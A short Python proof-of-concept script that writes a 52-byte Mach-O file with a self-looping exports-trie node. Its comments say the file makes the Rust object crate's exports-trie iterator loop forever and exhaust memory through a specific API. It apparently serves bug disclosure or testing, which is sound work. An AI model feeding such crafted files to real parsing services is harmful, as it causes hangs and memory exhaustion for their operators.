#!/usr/bin/env python3
# 52-byte Mach-O whose LC_DYLD_EXPORTS_TRIE points at a 4-byte self-referential trie node,
# making object's ExportsTrieIterator (exports_trie.rs) loop forever + grow Vec<Frame> unbounded.
# Reachable via the public LinkeditDataCommand::exports_trie() API (NOT File::parse / Object::exports).
import struct, sys
hdr  = struct.pack("<IiiIIII I", 0xfeedfacf, 0x01000007, 3, 6, 1, 16, 0, 0)   # mach_header_64, ncmds=1
lc   = struct.pack("<IIII", 0x80000033, 16, 48, 4)                            # LC_DYLD_EXPORTS_TRIE, dataoff=48, datasize=4
trie = bytes([0x00, 0x01, 0x00, 0x00])   # terminal_size=0, children=1, edge="", child_offset=0 -> self-loop
open(sys.argv[1] if len(sys.argv)>1 else "poc.bin","wb").write(hdr+lc+trie)
print("wrote", len(hdr+lc+trie), "bytes")
